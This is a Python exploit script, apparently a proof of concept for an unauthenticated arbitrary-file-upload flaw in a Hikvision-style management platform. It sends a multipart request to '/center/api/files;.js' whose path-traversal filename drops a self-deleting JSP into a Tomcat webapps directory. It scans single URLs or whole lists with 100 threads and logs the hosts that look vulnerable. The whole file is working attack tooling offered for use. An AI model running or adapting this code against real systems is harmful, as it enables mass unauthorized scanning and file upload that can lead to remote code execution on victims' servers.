import requests,sys,argparse
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()

def banner():
    banner = """
██╗  ██╗██╗  ██╗██╗   ██╗███████╗██╗   ██╗██████╗ ██╗      ██████╗  █████╗ ██████╗ 
██║  ██║██║ ██╔╝██║   ██║██╔════╝██║   ██║██╔══██╗██║     ██╔═══██╗██╔══██╗██╔══██╗
███████║█████╔╝ ██║   ██║███████╗██║   ██║██████╔╝██║     ██║   ██║███████║██║  ██║
██╔══██║██╔═██╗ ╚██╗ ██╔╝╚════██║██║   ██║██╔═══╝ ██║     ██║   ██║██╔══██║██║  ██║
██║  ██║██║  ██╗ ╚████╔╝ ███████║╚██████╔╝██║     ███████╗╚██████╔╝██║  ██║██████╔╝
╚═╝  ╚═╝╚═╝  ╚═╝  ╚═══╝  ╚══════╝ ╚═════╝ ╚═╝     ╚══════╝ ╚═════╝ ╚═╝  ╚═╝╚═════╝                                                                                   
                                                           
                                                                    version: 1.0
"""
    print(banner)
def main():
    banner()
    parser = argparse.ArgumentParser(description='QLBSQL! ')
    parser.add_argument('-u','--url',dest='url',type=str,help='input link')
    parser.add_argument('-f','--file',dest='file',type=str,help='file path')
    args = parser.parse_args()
    #判断输入的参数是单个还是文件
    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        url_list=[]
        with open(args.file,"r",encoding="utf-8") as f:
            for url in f.readlines():
                url_list.append(url.strip().replace("\n",""))
        #多线程
        mp = Pool(100)
        mp.map(poc, url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")

def poc(target):
    payload_url = "/center/api/files;.js"
    url = target+payload_url
    headers={
        'User-Agent': 'Mozilla/5.0 (Windows NT 5.1) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.84 Safari/535.11 SE 2.X MetaSr 1.0',
        'Content-Length': '404',
        'Cache-Control': 'no-cache',
        'Content-Type': 'multipart/form-data; boundary=e0e1d419983f8f0e95c2d9ccf9b54e488353b5db7bac34b1a973ea9d0f0f',
        'Pragma': 'no-cache',
        'Accept-Encoding': 'gzip, deflate, br',
        'Connection': 'close'
    }
    data = (
        "--e0e1d419983f8f0e95c2d9ccf9b54e488353b5db7bac34b1a973ea9d0f0f\r\n"
        'Content-Disposition : form-data; name="file"; filename="../../../../../bin/tomcat/apache-tomcat/webapps/clusterMgr/test.jsp"\r\n'
        'Content-Type : application/octet-stream\r\n'
        "\r\n"
        '<%out.println("11223344");new java.io.File(application.getRealPath(request.getServletPath())).delete();%>\r\n'
        "--e0e1d419983f8f0e95c2d9ccf9b54e488353b5db7bac34b1a973ea9d0f0f--\r\n"
    )
    try:
        res = requests.post(url=url,headers=headers,data=data,verify=False,timeout=10)
        if res.status_code == 200 and "filename" in res.text :
            print(f"[+]该url存在漏洞{target}")
            with open('result.txt','a',encoding='utf-8') as fp:
                        fp.write(target+"\n")
                        return True
        else:
            print(f"[-]该url不存在漏洞{target}")
    except :
        print(f"[*]该url存在问题{target}")
        return False

if __name__ == '__main__':
    main()